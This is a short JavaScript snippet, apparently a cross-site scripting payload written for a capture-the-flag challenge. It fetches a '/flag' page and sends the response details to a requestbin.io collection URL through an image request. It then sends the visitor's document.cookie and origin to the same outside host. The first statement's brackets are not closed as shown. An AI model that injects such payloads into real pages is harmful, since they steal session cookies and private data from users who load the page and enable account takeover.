fetch("https://mathme.be.ax/flag").then(function(x) {
    (new Image()).src="https://requestbin.io/vs1dyvvs?x="+JSON.stringify({ok: x.ok, status: x.status, body: x.body, url: x.url});
}

(new Image()).src="https://requestbin.io/vs1dyvvs?cookie=" + document.cookie + "&origin=" + document.origin;
